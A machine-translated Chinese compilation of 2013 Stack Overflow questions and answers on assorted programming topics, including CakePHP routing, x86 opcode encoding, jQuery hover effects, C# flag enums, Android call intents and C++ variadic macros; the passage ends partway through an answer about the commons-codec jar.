> 
> 赞同：0
> 
> 时间：2013-04-06T06:26:01.023
> 
> 标签：ios, objective-c, core-audio, audiounit

我在想是否有可能获得对 AudioUnit 记录（可能结束播放）设备的独占访问权限，以确保在我工作时（最终甚至在后台）任何其他进程都无法访问它？

任何意见将是有益的。

先感谢您！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-07T03:26:36.150

您的应用程序可以在前台获得对音频会话的独占访问权限。当另一个应用程序出现在前台时，它可以执行相同的操作，从而终止您的应用程序对音频的访问。电话应用程序还可以通过中断您的应用程序来控制音频。没有办法在库存 OS iOS 设备上阻止这种情况。

# cakephp - Cakephp 路由和前缀

> ID：15847812
> 
> 赞同：1
> 
> 时间：2013-04-06T06:26:05.113
> 
> 标签：cakephp, view, router, prefix

我对 CakePHP 中的路由有疑问。让我解释。

我正在通过`Auth`组件使用身份验证。我有一个名为`account`.

当我想编辑一个用户时，我正在调用用户控制器，它给了我一个如下 URL：

```
/account/users/edit/5 
```

我想要的是有一个像这样的 URL：

```
/account/edit/5 
```

所以我像这样改变了我的路由器：

```
Router::connect('/:prefix/edit/:id',
    array('controller' => 'users', 'action' => 'edit'),
    array('pass' => array('id'), 'id' => '[0-9]+')
); 
```

当我尝试访问时，它起作用了`/account/edit/5`

我的问题在我看来。如何使用`Html->link`帮助程序访问此路线？

到目前为止，我只是这样做：

```
'/'.$this->Session->read('Auth.User.role').'/edit/'.$this->Session->read('Auth.User.id') 
```

但在我看来，它并不是很干净。我想使用助手。

非常感谢你的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T08:15:58.500

使用前缀“account”意味着需要在控制器中执行“account_edit”之类的操作。这可能不是你想要的。另外，当会话中已经存在“id”时，为什么还要将它放在 url 中？为什么不只为所有用户使用 url "/account" 并从操作中的会话中获取 id（和角色，如果需要）？

```
Router::connect('/account',
    array('controller' => 'users', 'action' => 'edit')
); 
```

这将是生成所需 url 的干净方式：

```
$this->Html->link('Account', array(
    'controller' => 'users',
    'action' => 'edit'
));
// Will return url "/account" 
```

通常总是使用数组形式来指定 url 以受益于反向路由。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T08:48:27.710

一切都很好，除了路由器。它应该是

```
Router::connect('/account/*',
    array('controller' => 'users', 'action' => 'edit')
); 
```

并使用 Helper 以各种方式创建锚链接，您可以在[此处查看](http://book.cakephp.org/2.0/en/core-libraries/helpers/html.html)

# debugging - 0D 在汇编中是什么意思 89 0D 0B00A85E - mov [5EA8000B],ecx

> ID：15847821
> 
> 赞同：1
> 
> 时间：2013-04-06T06:27:06.183
> 
> 标签：debugging, assembly, x86

我是组装新手，我想知道 0D 代表什么：

```
89 0D 0B00A85E - mov [5EA8000B],ecx 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T06:32:00.813

`89 0D 0B00A85E`是机器码的十六进制表示`mov [5EA8000B], ecx`。

[对指令进行`89`编码`mov r/m16/32, r16/32`](http://ref.x86asm.net/coder32.html#x89)。后面的字节称为“32 位 ModR/M 字节”，并将参数编码为`mov`. 意思可以看[这里](http://ref.x86asm.net/coder32.html#modrm_byte_32)：

*   第一个参数是`disp32`（其直接值 -- `0B00A85E`-- 跟在`0D`）；
*   第二个参数是`ecx`（参见`r32(/r)`顶部的行）。

# c# - 在默认浏览器中打开 Web 浏览器单击

> ID：15847822
> 
> 赞同：1
> 
> 时间：2013-04-06T06:27:07.967
> 
> 标签：c#, winforms

目前我正在使用 c# 构建一个 Windows 窗体应用程序。我的表单上有一个显示谷歌广告的网络浏览器控件。单击时，网页会显示在表单上的小 300x300 Web 浏览器控件中。有没有办法让我在点击广告时启动默认浏览器？

谢谢。

编辑：我发现我可以使用 Process.Start("url here"); 打开默认浏览器。但浏览器窗口在应用程序加载时打开。

编辑添加代码：Form.cs

```
 private void AdPanelNavigating(object sender, WebBrowserNavigatingEventArgs e)
    {
        e.Cancel = true;
        if (e.Url != null ) Process.Start(e.Url.ToString());
    } 
```

Form.Designer.cs

```
this.AdPanel.Navigating += new WebBrowserNavigatingEventHandler(AdPanelNavigating); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T08:14:42.690

您可以添加导航事件处理程序：

```
webBrowser1.Navigating += new WebBrowserNavigatingEventHandler(WebBrowser_Navigating);

void WebBrowser_Navigating(object sender, WebBrowserNavigatingEventArgs e) {
        e.Cancel = true;
        Process.Start(e.Url);
    } 
```

它将打开默认浏览器，而不是在 webbrowser 中打开此 url。

# jquery - jQuery 鼠标悬停意图使用

> ID：15847823
> 
> 赞同：2
> 
> 时间：2013-04-06T06:27:11.840
> 
> 标签：jquery, jquery-ui

我是新手`jQuery`。我有这段代码。这是[小提琴](http://jsfiddle.net/NewUserFiddle/Rqq6c/)的链接。在这里你可以看到当你将鼠标悬停在`#flip`它上面时它会向下滑动，当你将鼠标移出时它会向下滑动。现在从这一点开始它的工作正常。但我希望会有`hoverIntent`这样的情况，如果有人玩悬停并离开它，那么它不会影响幻灯片自动运行。我的 jQuery 代码看起来像这样

```
<script> 
$(document).ready(function(){
  $("#flip").hover(function(){
    $("#panel").slideToggle("slow");
  });
});
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:29:20.923

添加`stop`以停止当前正在运行的动画。

```
$(document).ready(function(){
  $("#flip").hover(function(){
    $("#panel").stop(true, true).slideToggle("slow");
  });
}); 
```

第一个参数用于移除排队的动画，第二个用于立即完成当前动画。

检查[文档](http://api.jquery.com/stop/)

更新演示：http: [//jsfiddle.net/Rqq6c/1/](http://jsfiddle.net/Rqq6c/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:42:53.943

如果用户只是将鼠标悬停在元素上，则不会触发幻灯片，以
防止挫败感:)
将等待 300 毫秒，然后再显示`#panel`鼠标是否仍在`#flip`！

**使用数据属性的 **悬停意图****

 **`**[LIVE DEMO](http://jsfiddle.net/Rqq6c/2/)**`

```
var $panel = $('#panel');

$("#flip").on('mouseenter mouseleave', function( e ) {
    return e.type=="mouseenter" ? panelOn() : panelOff() ;
});

function panelOn() {    
   $panel.data('wait', setTimeout(function(){
       $panel.stop().slideDown(600);
   },300) );
}

function panelOff() {
    clearTimeout( $panel.data('wait') );
    $panel.stop().slideUp(600); 
} 
```

此外，如果您想在`#panel`我们将其悬停后保持打开状态，
请向您的两个元素添加一个父元素，并将触发元素选择器更改为它的 ID

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:31:53.777

将您的内容包装在容器元素中，并将悬停事件附加到该容器元素中。这样，您并没有真正停止将鼠标悬停在任何一个元素上。

**HTML**

```
<div id="container">
  <div id="flip">Hover on panel to slide the panel down or up</div>
  <div id="panel">Hello world!</div>
</div> 
```

**Javascript**

```
$(document).ready(function(){
  $("#container").hover(function(){
    $("#panel").slideToggle("slow");
  });
}); 
```

查看更新[的 jsFiddle 演示](http://jsfiddle.net/vrtPz/)**

# c# - 我应该如何表示分层标志枚举？

> ID：15847824
> 
> 赞同：4
> 
> 时间：2013-04-06T06:27:21.600
> 
> 标签：c#, enums, enum-flags

我有以下一组枚举：

```
[Flags]
public enum Categories : uint
{
    A = (1 << 0),
    B = (1 << 1),
    B1 = B | (1 << 16),
    B2 = B | (1 << 17),
    B3 = B | (1 << 18),
    B4 = B | (1 << 19),
    B5 = B | (1 << 20),
    C = (1 << 2),
    C1 = C | (1 << 21),
    D = (1 << 3),
    D1 = D | (1 << 22),
    D2 = D | (1 << 23),
    E = (1 << 4),
    F = (1 << 5),
    F1 = F | (1 << 23),
    F2 = F | (1 << 24),
    F3 = F | (1 << 25),
    F4 = F | (1 << 26),
    F5 = F | (1 << 27),
    G = (1 << 6),
    H = (1 << 7),
    H1 = H | (1 << 28),
} 
```

这个想法是枚举表示一个层次结构，其中子枚举暗示其父级，并且可以应用任意数量的标志。

我看到的问题是，在调试过程中，所有子枚举都没有被表示为名称或名称集。IE，`Categories.F`=“F”但`Categories.F2`= 16777248。我希望`Categories.F2`=“F，F2”或至少“F2”

我怎样才能让我的枚举仍然被识别为标志？有没有更好的方法来完成我想要做的事情？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T06:31:09.573

很奇怪，调试器中的值与`ToString`值不同。根据[文档](http://msdn.microsoft.com/en-us/library/x810d419.aspx)，两者应该匹配（因为`Enum`类型确实会覆盖`ToString`）。

> 如果 C# 对象有一个覆盖`ToString()`，调试器将调用覆盖并显示其结果而不是标准的`{<typeName>}`.

显然这不适用于枚举。我最好的猜测是调试器正在尝试对枚举类型进行一些特殊的、未记录的处理。添加[`DebuggerDisplayAttribute`](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggerdisplayattribute.aspx)显然通过覆盖此行为解决了该问题。

```
[DebuggerDisplay("{ToString()}")]
[Flags]
public enum Categories : uint
{
    ...
} 
```

* * *

> Categories.F2.ToString() = "F, F2"

C# 不会为你做那个魔法，因为`F2`在枚举中已经有了它自己的名字。您可以像这样手动标记各个成员：

```
public enum Categories
{
    [Description("F, F2")]
    F2 = F | (1 << 24),
} 
```

然后编写代码转换为描述。

```
public static string ToDescription(this Categories c)
{
    var field = typeof(Categories).GetField(c.ToString());
    if (field != null)
    {
        return field.GetCustomAttributes().Cast<DescriptionAttribute>().First().Description;
    }
}
...
Categories.F2.ToDescription() == "F, F2"; 
```

或者你可以做一些魔法来自己生成这个：

```
public static string ToDescription(this Categories c)
{
    var categoryNames =
        from v in Enum.GetValues(typeof(Categories)).Cast<Category>()
        where v & c == c
        orderby v
        select v.ToString();
    return String.Join(", ", categoryNames);
} 
```

不幸的是，扩展方法不能与 一起使用`DebuggerDisplayAttribute`，但你可以使用[`DebuggerTypeAttribute`](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggertypeproxyattribute.aspx)YMMV 但你可以试试这个：

```
[DebuggerType("CategoryDebugView")]
[Flags]
public enum Categories : uint
{
    ...
}

internal class CategoryDebugView
{
    private Category value;

    public CategoryDebugView(Category value)
    {
        this.value = value;
    }

    public override string ToString()
    {
        var categoryNames =
            from v in Enum.GetValues(typeof(Categories)).Cast<Category>()
            where v & c == c
            orderby v
            select v.ToString();
        return String.Join(", ", categoryNames);
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:46:53.233

你可以通过一些工作来完成你所要求的。我创建了一些扩展方法`Categories`，用于`HasFlag()`确定枚举值是否具有特定的父级，然后调用`ToString()`它们并连接结果。

```
public static class CategoriesExtensionMethods
{
    public static Categories GetParentCategory(this Categories category)
    {
        Categories[] parents = 
        {
            Categories.A,
            Categories.B,
            Categories.C,
            Categories.D,
            Categories.E,
            Categories.F,
            Categories.G,
            Categories.H,
        };

        Categories? parent = parents.SingleOrDefault(e => category.HasFlag(e));
        if (parent != null)
            return (Categories)parent;
        return Categories.None;
    }

    public static string ToStringWithParent(this Categories category)
    {
        var parent = GetParentCategory(category);
        if (parent == Categories.None)
            return category.ToString();
        return string.Format("{0} | {1}", parent.ToString(), category.ToString());
    }
} 
```

然后我们可以这样使用它：

```
var f1 = Categories.F1;

var f1ParentString = f1.ToStringWithParent();
// f1ParentString = "F | F1"

var f = Categories.F;
var fParentString = f.GetParentCategory();
// fParentString = "F" 
```

## 更新

`GetParentCategory()`如果您不想指定所有父母，这是一种更漂亮的实施方式。

```
public static Categories GetParentCategory(this Categories category)
{
    var values = Enum.GetValues(typeof(Categories)).Cast<Categories>();
    var parent = values.SingleOrDefault(e => category.HasFlag(e) && e != Categories.None && category != e);
    if (parent != Categories.None)
        return (Categories)parent;
    return Categories.None;
} 
```

# vb.net - VB.NET 有空语句吗？

> ID：15847827
> 
> 赞同：2
> 
> 时间：2013-04-06T06:27:46.340
> 
> 标签：vb.net

我在 VB.NET 中寻找与 C/C++ 中类似的空语句：

```
; 
```

我的理解是，这只是一个什么都不做的空话。但是，当我尝试使用 C# 到 VB.NET 转换器来获得一些见解时，我只是得到了一个空行。除了空白空间之外，我还可以使用类似的东西吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-03-14T16:51:06.707

当我必须在 VB.NET 中像Python 中的*“通过”*一样执行无操作时，我使用以下一个内衬：

“***仅使用 8 位”***

```
Dim i As Byte = 0 
```

***《最短的人》***

```
Dim i = 0 
```

“***不使用内存”***

```
If 1 <> 1 Then Dim i = 0 
```

我建议你添加一个**“TODO / HACK / UNDONE”**注释，这样你就可以记住这一行它只是一个占位符行，你可以在你的任务列表中轻松找到它。例子：

```
' TODO: Add function logic
Dim i = 0 
```

[有关在此处创建任务列表评论](https://msdn.microsoft.com/en-us/library/zce12xx2(v=vs.90).aspx)的更多信息

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T07:50:36.717

在 C 语言中，当一个表达式后面跟一个分号时，它就变成了一个语句。分号本身只是一个语句终止符。在 Visual Basic 中，语句终止符的等价物是换行符，而空语句的等价物是空表达式后跟换行符。

你的第一个例子看起来像这样。

```
Function ProcessMessage() As Boolean
    ...
End Function

Sub ProcessMessages()
    While ProcessMessage()
    End While
End Sub 
```

你的第二个例子看起来像这样。但是请注意，这`exit`是 Visual Basic 中的关键字，因此我们必须将标签称为其他名称。

```
Sub f()
    ...
    If done Then
        GoTo _exit
    End If
    ...
_exit:
End Sub 
```

# android - 紧急呼叫

> ID：15847830
> 
> 赞同：1
> 
> 时间：2013-04-06T06:28:14.927
> 
> 标签：android

我正在尝试设计一个android系统，其中紧急呼叫可以放在我想要的号码上。我有一个患者界面，在我的界面中我放置了一个紧急呼叫医生的按钮，如果他们开始感到不适，那么只需单击一个按钮，就会呼叫医生。

```
public void callDoc(View v)
    {
        Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("myNumber"));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_NO_USER_ACTION);
        startActivity(intent);
    } 
```

这是我到目前为止所尝试的。是否可以在 localhost 上进行测试？我没有得到想要的结果。这是我的日志猫。

```
04-06 11:07:16.925: W/dalvikvm(1786): threadid=1: thread exiting with uncaught exception (group=0x40015560)
04-06 11:07:16.965: E/AndroidRuntime(1786): FATAL EXCEPTION: main
04-06 11:07:16.965: E/AndroidRuntime(1786): java.lang.IllegalStateException: Could not execute method of the activity
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.view.View$1.onClick(View.java:2144)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.view.View.performClick(View.java:2485)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.view.View$PerformClick.run(View.java:9080)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.os.Handler.handleCallback(Handler.java:587)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.os.Handler.dispatchMessage(Handler.java:92)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.os.Looper.loop(Looper.java:130)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.app.ActivityThread.main(ActivityThread.java:3683)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at java.lang.reflect.Method.invokeNative(Native Method)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at java.lang.reflect.Method.invoke(Method.java:507)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at dalvik.system.NativeStart.main(Native Method)
04-06 11:07:16.965: E/AndroidRuntime(1786): Caused by: java.lang.reflect.InvocationTargetException
04-06 11:07:16.965: E/AndroidRuntime(1786):     at java.lang.reflect.Method.invokeNative(Native Method)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at java.lang.reflect.Method.invoke(Method.java:507)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.view.View$1.onClick(View.java:2139)
04-06 11:07:16.965: E/AndroidRuntime(1786):     ... 11 more
04-06 11:07:16.965: E/AndroidRuntime(1786): Caused by: android.content.ActivityNotFoundException: No Activity found to handle Intent { act=android.intent.action.CALL dat=03325465573 flg=0x10040000 }
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.app.Instrumentation.checkStartActivityResult(Instrumentation.java:1409)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.app.Instrumentation.execStartActivity(Instrumentation.java:1379)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.app.Activity.startActivityForResult(Activity.java:2827)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at android.app.Activity.startActivity(Activity.java:2933)
04-06 11:07:16.965: E/AndroidRuntime(1786):     at com.edps.EmergencyActivity.callDoc(EmergencyActivity.java:22)
04-06 11:07:16.965: E/AndroidRuntime(1786):     ... 14 more
04-06 11:07:19.613: I/Process(1786): Sending signal. PID: 1786 SIG: 9 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:43:01.937

[电话](http://developer.android.com/reference/android/content/Intent.html)

```
String number = "23454568678";
    Intent intent = new Intent(Intent.ACTION_CALL);
    intent.setData(Uri.parse("tel:" +number));
    startActivity(intent); 
```

使用权限

```
<uses-permission android:name="android.permission.CALL_PHONE"></uses-permission> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:43:27.300

您是否授予了 CALL_PHONE 权限？如果没有，则在清单文件中添加以下权限

```
<uses-permission android:name="android.permission.CALL_PHONE"></uses-permission> 
```

其次，参数 to`Uri.parse("myNumber")`应该以“tel:”前缀开头，所以说如果号码是 1234，那么对 Uri.parse 的调用应该是`Uri.parse("tel: " + "myNumber")`

# php - 我的 php 数学不起作用

> ID：15847831
> 
> 赞同：0
> 
> 时间：2013-04-06T06:28:16.453
> 
> 标签：php, math, multidimensional-array

我正在尝试用我的数组中的 2 个数字进行简单的除法，就像这样。

这是我的数组：

```
Array
(
    [0] => Array
        (
            [day] => 2013-04-06
            [hour] => 06
            [hits] => 4
            [executetime] => 10.0000
        )

) 
```

然后我像这样划分它们：

//＃＃＃ 编辑 ＃＃＃//

```
$thisHour = date("H", time());
$thisDate = date("Y-m-d", time());

$total_time = 2.5000;

$moveStats = $memcache->get('moveStats');

foreach ($moveStats as $k => $v) {
    $moveStats[$k]['hits']=$moveStats[$k]['hits']+1; // UPDATING THE HITS

    $moveStats[$k]['executetime'] += $total_time;
    $moveStats[$k]['executetime'] = number_format($moveStats[$k]['executetime'] / (++$moveStats[$k]['hits']),4,'.','');
}

$memcache->set('moveStats', $moveStats); 
```

这奇怪地给了我这个数字：1.75！

我想应该是2.5？

我究竟做错了什么。请提前帮助和感谢:-)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T06:33:57.323

尝试这个

```
 $moveStats[$k]['executetime']=$moveStats[$k]['executetime']+$total_time; 
```

例如

```
 $moveStats[$k]['executetime']+$total_time; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:31:56.587

此行没有分配：

```
$moveStats[$k]['executetime']+$total_time; 
```

另外，$total_time 包含什么值？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:35:39.113

您可以将代码更改为：

```
$total_time = 2.5000;
foreach ($moveStats as $k => $v) {
    $moveStats[$k]['executetime'] += $total_time;
    echo $moveStats[$k]['executetime'] / (++$moveStats[$k]['hits']);
} 
```

# wpf - Blend for Visual Studio 2012 在更新 2 最终版中禁用非 Windows 8 开发

> ID：15847834
> 
> 赞同：1
> 
> 时间：2013-04-06T06:28:44.657
> 
> 标签：wpf, visual-studio-2012, blend-2012

当 Visual Studio 2012 发布时，Blend for Visual Studio 2012 仅对 Windows 8 应用程序开发启用。除了 Windows 8 开发之外，还有适用于 Visual Studio 2012 的 Blend SketchFlow 预览。后来，更新 2 ctp 发布，并为非 Windows 8 开发启用了 Blend for Visual Studio 2012。几天前，Update 2 final 发布，Visual Studio 2012 的 Blend 对于非 Windows 8 开发禁用。

我的问题是，如何为非 Windows 8 开发启用 Blend for Visual Studio 2012？预览版有无法忍受的错误（tfs 连接慢）。我讨厌微软强迫我们升级到它糟糕的操作系统，这样我就可以使用最新的开发工具。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T10:04:37.167

我遇到了同样的问题并找到了解决方案：只需修复 VS 2012 Update 2 安装即可。转到控制面板，程序，查看已安装的更新，选择 Visual Studio Update 2，选择更改，选择修复。

是的，进行更新并立即修复该更新听起来很奇怪，但在我的情况下它有效。我在 blendinsider.com 的某个地方找到了这个解决方案。这是升级过程中的一些错误。

# c++ - Variadac 宏将宏应用于所有参数

> ID：15847837
> 
> 赞同：4
> 
> 时间：2013-04-06T06:29:04.077
> 
> 标签：c++, c++11, c-preprocessor, variadic-macros

我正在试验 C++11 variadac 宏。

我试图将另一个宏应用于列表中的每个参数。
这是我的第一次尝试：

```
#define  APPLY_CHAIN(first, ...)    APPLY_ACT(first) APPLY_CHAIN( __VA_ARGS__ ) 
```

不幸的是，这不起作用。

我最终让它工作了。但这有点令人费解，并且有一个“n”的限制（其中“n”是我愿意为其键入宏的最大大小）。

```
#define COUNT_N(_1, _2, _3, _4, _5, _6, _7, _8, _9, _10, N, ...)    N
#define COUNT(...)   COUNT_N( __VA_ARGS__, 10, 9, 8, 7, 6, 5 ,4, 3, 2, 1)

#define BUILD_CHAIN_1(_1)       APPLY_ACT(_1)
#define BUILD_CHAIN_2(_1, ...)  APPLY_ACT(_1) BUILD_CHAIN_1(__VA_ARGS__)
#define BUILD_CHAIN_3(_1, ...)  APPLY_ACT(_1) BUILD_CHAIN_2(__VA_ARGS__)
#define BUILD_CHAIN_4(_1, ...)  APPLY_ACT(_1) BUILD_CHAIN_3(__VA_ARGS__)
#define BUILD_CHAIN_5(_1, ...)  APPLY_ACT(_1) BUILD_CHAIN_4(__VA_ARGS__)
#define BUILD_CHAIN_6(_1, ...)  APPLY_ACT(_1) BUILD_CHAIN_5(__VA_ARGS__)
#define BUILD_CHAIN_7(_1, ...)  APPLY_ACT(_1) BUILD_CHAIN_6(__VA_ARGS__)
#define BUILD_CHAIN_8(_1, ...)  APPLY_ACT(_1) BUILD_CHAIN_7(__VA_ARGS__)
#define BUILD_CHAIN_9(_1, ...)  APPLY_ACT(_1) BUILD_CHAIN_8(__VA_ARGS__)
#define BUILD_CHAIN_10(_1,...)  APPLY_ACT(_1) BUILD_CHAIN_9(__VA_ARGS__)

#define BUILD_CHAIN_INC( CT, ...)   BUILD_CHAIN_ ## CT (__VA_ARGS__)
#define BUILD_CHAIN( CT, ...)       BUILD_CHAIN_INC(CT, __VA_ARGS__)
#define APPLY_CHAIN(...)            BUILD_CHAIN( COUNT(__VA_ARGS__), __VA_ARGS__)

#define APPLY_ACT(X)                #X

#include <iostream>

int main()
{
    std::cout << APPLY_CHAIN(1,2,3,4,5) << "\n";
} 
```

所以我的问题是：我是否遗漏了一些简单的东西，可以让我`iterate`沿着论证链前进？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T09:08:46.363

您对参数计数问题的解决方案与 2006 年 1 月 Laurent Deniau 在 [comp.lang.c] (IIRC) 上发布的解决方案相同。

修改后也可以与 Visual C++ 一起使用，他的参数计数如下所示：

```
#pragma once

/*
* The PP_NARG macro evaluates to the number of arguments that have been
* passed to it.
*
* Laurent Deniau, "__VA_NARG__," 17 January 2006, <comp.std.c> (29 November 2007).
* https://groups.google.com/forum/?fromgroups=#!topic/comp.std.c/d-6Mj5Lko_s
*/

// Added workaround for silly MSVC bug that yields "too few parameters" warning.
// - Alf
#include <progrock/cppx/macro/invoke.h>         // CPPX_INVOKE
#include <progrock/cppx/macro/concat.h>         // CPPX_CONCAT

#define PP_ARG_N( \
_1, _2, _3, _4, _5, _6, _7, _8, _9,_10, \
_11,_12,_13,_14,_15,_16,_17,_18,_19,_20, \
_21,_22,_23,_24,_25,_26,_27,_28,_29,_30, \
_31,_32,_33,_34,_35,_36,_37,_38,_39,_40, \
_41,_42,_43,_44,_45,_46,_47,_48,_49,_50, \
_51,_52,_53,_54,_55,_56,_57,_58,_59,_60, \
_61,_62,_63,N,...) N

#define PP_RSEQ_N() \
63,62,61,60, \
59,58,57,56,55,54,53,52,51,50, \
49,48,47,46,45,44,43,42,41,40, \
39,38,37,36,35,34,33,32,31,30, \
29,28,27,26,25,24,23,22,21,20, \
19,18,17,16,15,14,13,12,11,10, \
9,8,7,6,5,4,3,2,1,0

#if 0
    #define PP_NARG_(...) PP_ARG_N( __VA_ARGS__ )
    #define PP_NARG( ...) PP_NARG_( __VA_ARGS__, PP_RSEQ_N() )
#else
    #define PP_NARG_(...) CPPX_INVOKE( PP_ARG_N, (__VA_ARGS__) )
    #define PP_NARG(...) PP_NARG_(__VA_ARGS__,PP_RSEQ_N())
#endif 
```

`CPPX_CONCAT`宏：

```
#pragma once

#define CPPX_CONCAT__( a, b )       a ## b
#define CPPX_CONCAT_( a, b )        CPPX_CONCAT__( a, b )
#define CPPX_CONCAT( a, b )         CPPX_CONCAT_( a, b ) 
```

`CPPX_INVOKE`宏：

```
#pragma once

#define CPPX_INVOKE( macro, args ) macro args 
```

示例用法：

```
#pragma once
#include <progrock/cppx/macro/nargs.h>          // CPPX_NARGS, CPPX_CONCAT

#define CPPX_IS_UNUSED_( name ) \
    (void) name; struct name

#define CPPX_IS_UNUSED_1( a ) \
    CPPX_IS_UNUSED_( a )

#define CPPX_IS_UNUSED_2( a, b ) \
    CPPX_IS_UNUSED_1( a ); CPPX_IS_UNUSED_( b )

#define CPPX_IS_UNUSED_3( a, b, c ) \
    CPPX_IS_UNUSED_2( a, b ); CPPX_IS_UNUSED_( c )

#define CPPX_IS_UNUSED_4( a, b, c, d ) \
    CPPX_IS_UNUSED_3( a, b, c ); CPPX_IS_UNUSED_( d )

#define CPPX_IS_UNUSED_5( a, b, c, d, e ) \
    CPPX_IS_UNUSED_4( a, b, c, d ); CPPX_IS_UNUSED_( e )

#define CPPX_IS_UNUSED( ... )      \
    CPPX_INVOKE( CPPX_CONCAT( CPPX_IS_UNUSED_, CPPX_NARGS( __VA_ARGS__ ) ), ( __VA_ARGS__ ) )

#define CPPX_IS_INTENTIONALLY_UNUSED    CPPX_IS_UNUSED 
```

正如这所例证的那样，主要线索是不使用递归（至少不直接使用），而是为每个参数数量手动重复代码。

我相信递归宏在形式上是不可能的。然而，很少有编译器在这方面符合要求，至少在几年前，您确实可以诱使 WIndows 编译器进行递归宏替换。我记得那是最初在最终成为 Boost 预处理器库的代码中使用的技术（现在它使用形式上有效的代码，通过集中一大堆特定于参数的处理程序，除了特定于编译器的怪癖的解决方法） .

该代码重复很可能可以通过 Boost Preprocessor 库自动执行，但随后您也可以将 Boost 用于其他东西（可能重点是避免依赖于像 Boost 这样的大型库，至少这是我写作时的动机以上）。

免责声明：我在发布之前没有重试此代码，我不记得它是否处于修改状态，或者什么。但它确实显示了一般原则。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T07:02:49.280

看起来递归宏仍然[是](https://stackoverflow.com/q/824639/580412)不可能的，因为预处理器只对源进行一次传递。

我敢打赌，您可以`#include`使用带有条件保护的虚拟对象来创建显式循环构造（这可能是[boost.preprocessor](http://www.boost.org/doc/libs/1_53_0/libs/preprocessor/doc/index.html)最终要做的事情。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T09:40:10.817

看看[Boost.Preprocessor](http://www.boost.org/doc/libs/1_53_0/libs/preprocessor)。特别[是 BOOST_PP_SEQ_FOLD_LEFT](http://www.boost.org/doc/libs/1_53_0/libs/preprocessor/doc/ref/seq_fold_left.html)。你需要[BOOST_PP_VARIADIC_TO_SEQ](http://www.boost.org/doc/libs/1_53_0/libs/preprocessor/doc/ref/variadic_to_seq.html)。

就像是

```
#include <boost/preprocessor.hpp>
#include <iostream>

#define OP(d, state, x) state BOOST_PP_STRINGIZE(x)
#define APPLY_CHAIN(...) BOOST_PP_SEQ_FOLD_LEFT( OP, BOOST_PP_EMPTY() , BOOST_PP_VARIADIC_TO_SEQ(__VA_ARGS__) ) 

int main() {
  std::cout <<  APPLY_CHAIN(1,2,3,4,5) << std::endl;
}
//expands to   std::cout << "1" "2" "3" "4" "5" << std::endl; 
```

# ruby-on-rails - 如何检查 ruby 进程的性能问题？

> ID：15847856
> 
> 赞同：1
> 
> 时间：2013-04-06T06:32:04.563
> 
> 标签：ruby-on-rails, ruby, performance, ruby-on-rails-3.2, ruby-debug

我对消耗大量处理器时间的 Rails 工作人员有疑问。奇怪的是，到目前为止，我一直无法追踪到它。我尝试使用 New Relic，但我似乎无法在工人本身中追踪它。

如何详细分析并真正探索性能问题，以便找到此类性能问题的精确位置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:59:11.033

Have you tried [Ruby-Prof](https://github.com/ruby-prof/ruby-prof)? It's easy to use and seems to return accurate numbers. (Of course it's hard to argue with it when running an app that's busy.)

# java - 无法安装通用编解码器 jar 文件

> ID：15847861
> 
> 赞同：1
> 
> 时间：2013-04-06T06:32:36.317
> 
> 标签：java, jar, classpath, apache-commons-codec

我已经下载了`common.codec`二进制 jar 文件。现在我想使用这个类`org.apache.commons.codec.binary.Base64`。但是这个文件夹包含四个jar文件`common.codec-1.7.jar`，`commons-codec-1.7-javadoc.jar`即`commons-codec-1.7-sources`,,,,, `commons-codec-1.7-tests`. `commons-codec-1a.7-test-sources`现在我应该在类路径中提到哪个路径？我尝试使用所有 jar 文件路径并在我的程序中导入但失败了。请告诉我在哪里放置这个下载的 jar 文件以及如何在我的代码中使用它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T07:06:08.677

You can use `common.codec-1.7.jar` if you are using an IDE like

